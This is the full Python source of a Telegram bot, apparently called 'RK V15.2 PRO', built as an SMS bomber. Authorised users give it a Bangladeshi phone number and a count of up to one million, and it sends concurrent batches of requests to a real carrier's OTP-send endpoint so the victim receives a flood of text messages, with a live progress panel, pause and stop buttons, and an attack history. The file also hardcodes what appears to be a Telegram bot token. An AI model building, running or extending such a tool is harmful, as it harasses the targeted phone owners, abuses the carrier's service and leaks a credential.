import asyncio
import aiohttp
import telebot
import time
import json
import os
import logging
import psutil
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from aiohttp import web 
from datetime import datetime
import pytz

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
WAKEUP_URL = "https://rkbombx.onrender.com" 
DB_FILE = "rk_users_v15.json"
HISTORY_FILE = "rk_history_v15.json"
SYSTEM_STATS_FILE = "rk_system_stats.json"

# Logging & Timezone
logging.basicConfig(level=logging.INFO)
bot = AsyncTeleBot(API_TOKEN)
TZ = pytz.timezone('Asia/Dhaka')

# Global Storage
active_attacks = {}  
user_states = {}
authorized_users = {ADMIN_ID}
attack_history = []
global_sms_count = 0

# --- DATA PERSISTENCE ---
def load_all_data():
    global authorized_users, attack_history, global_sms_count
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, "r") as f: authorized_users = set(json.load(f))
        if os.path.exists(HISTORY_FILE):
            with open(HISTORY_FILE, "r") as f: attack_history = json.load(f)
        if os.path.exists(SYSTEM_STATS_FILE):
            with open(SYSTEM_STATS_FILE, "r") as f:
                stats = json.load(f)
                global_sms_count = stats.get("total_sent", 0)
    except: pass

def save_data():
    try:
        with open(DB_FILE, "w") as f: json.dump(list(authorized_users), f, indent=4)
        with open(HISTORY_FILE, "w") as f: json.dump(attack_history[-50:], f, indent=4)
        with open(SYSTEM_STATS_FILE, "w") as f: json.dump({"total_sent": global_sms_count}, f, indent=4)
    except: pass

# --- HEALTH SERVER & WAKEUP ---
async def keep_alive():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(WAKEUP_URL) as resp:
                    logging.info(f"Self-Ping Status: {resp.status}")
            except: pass
            await asyncio.sleep(300)

async def handle_health_check(request):
    return web.Response(text="Bot is running!", content_type='text/plain')

async def start_health_server():
    app = web.Application()
    app.router.add_get('/', handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# --- BUTTONS ---
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "📊 System Info", "📜 Attack History", "📞 Support")
    return markup

def get_control_panel(chat_id, status):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if status == "running" else "▶️ Resume"
    p_callback = f"pau_{chat_id}" if status == "running" else f"res_{chat_id}"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_callback),
        types.InlineKeyboardButton("⏹ Stop", callback_data=f"stp_{chat_id}")
    )
    return markup

# --- BOMBING CORE ---
async def perform_sms(session, number, stats):
    global global_sms_count
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=5) as resp:
            if resp.status == 200:
                stats['ok'] += 1
                global_sms_count += 1
            else: stats['err'] += 1
    except: stats['err'] += 1
    stats['total'] += 1

async def attack_orchestrator(chat_id, message_id, target, limit):
    evt = asyncio.Event()
    evt.set()
    start_time = datetime.now(TZ)
    active_attacks[chat_id] = {'event': evt, 'status': 'running', 'stop': False, 'target': target}
    stats = {'ok': 0, 'err': 0, 'total': 0}
    
    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            if active_attacks.get(chat_id, {}).get('stop'): break
            if not evt.is_set(): await evt.wait()
            
            # Optimized Batching
            batch = min(35, limit - stats['total'])
            tasks = [perform_sms(session, target, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)
            
            # UI Update
            try:
                prog = int((stats['total']/limit)*100)
                bar = "🔹" * (prog // 10) + "▫️" * (10 - (prog // 10))
                elapsed = int((datetime.now(TZ) - start_time).total_seconds())
                
                monitor = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{target}`\n"
                    f"📊 **Progress:** `{prog}%` {bar}\n"
                    f"✅ **Success:** `{stats['ok']}` ]\n"
                    f"❌ **Fail:** `{stats['err']}` ]\n"
                    f"🔢 **Total Sent:** `{stats['total']}/{limit}` ]\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🕒 **Started:** `{start_time.strftime('%I:%M:%S %p')}` ]\n"
                    f"⏳ **Running_Time:** `{elapsed}s` ]\n"
                    f"📡 **STATUS:** `{active_attacks[chat_id]['status'].upper()}` ]\n"
                    f"━━━━━━━━━━━━━━━━━━━━"
                )
                await bot.edit_message_text(monitor, chat_id, message_id, 
                                          reply_markup=get_control_panel(chat_id, active_attacks[chat_id]['status']),
                                          parse_mode="Markdown")
            except: pass
            await asyncio.sleep(0.5)

    active_attacks.pop(chat_id, None)
    save_data()
    await bot.send_message(chat_id, f"🏁 **Attack Finished!**\nTarget: `{target}`\nTotal Sent: `{stats['ok']}`", reply_markup=get_main_menu())

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
async def start_cmd(m):
    await bot.send_message(m.chat.id, "🔥 **RK V15.2 PRO ONLINE**\nঅ্যাটাক শুরু করতে নিচের বাটন চাপুন।", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
async def start_attack_init(m):
    if m.chat.id not in authorized_users:
        return await bot.reply_to(m, "🚫 অনুমতি নেই!")
    user_states[m.chat.id] = {"step": "num"}
    await bot.send_message(m.chat.id, "📞 **নম্বর দিন (১১ ডিজিট):**", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda m: m.chat.id in user_states)
async def handle_input(m):
    state = user_states[m.chat.id].get("step")
    
    if state == "num":
        if len(m.text) == 11 and m.text.isdigit():
            user_states[m.chat.id] = {"step": "limit", "target": m.text}
            await bot.send_message(m.chat.id, "🔢 **পরিমাণ দিন (সর্বোচ্চ ১,০০০,০০০):**")
        else:
            await bot.reply_to(m, "❌ ভুল নম্বর! আবার দিন।")
            
    elif state == "limit":
        try:
            limit = int(m.text)
            if limit > 1000000: limit = 1000000
            target = user_states[m.chat.id]['target']
            user_states.pop(m.chat.id)
            
            msg = await bot.send_message(m.chat.id, "⚡ ইঞ্জিন শুরু হচ্ছে...")
            asyncio.create_task(attack_orchestrator(m.chat.id, msg.message_id, target, limit))
        except:
            await bot.reply_to(m, "⚠️ শুধু সংখ্যা দিন!")

@bot.message_handler(func=lambda m: m.text == "📊 System Info")
async def sys_info(m):
    txt = (f"🖥 **SYSTEM INFO**\n"
           f"⚡ CPU: `{psutil.cpu_percent()}%` | RAM: `{psutil.virtual_memory().percent}%` \n"
           f"📨 Total Sent: `{global_sms_count}`\n"
           f"🚀 Status: `Operational`")
    await bot.reply_to(m, txt, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: True)
async def callback_handler(c):
    cid = c.message.chat.id
    if c.data.startswith("pau_") and cid in active_attacks:
        active_attacks[cid]['event'].clear()
        active_attacks[cid]['status'] = "paused"
    elif c.data.startswith("res_") and cid in active_attacks:
        active_attacks[cid]['event'].set()
        active_attacks[cid]['status'] = "running"
    elif c.data.startswith("stp_") and cid in active_attacks:
        active_attacks[cid]['stop'] = True
        active_attacks[cid]['event'].set()
    await bot.answer_callback_query(c.id)

# --- RUN ---
async def main():
    load_all_data()
    await asyncio.gather(start_health_server(), keep_alive(), bot.polling(non_stop=True))

if __name__ == "__main__":
    asyncio.run(main())
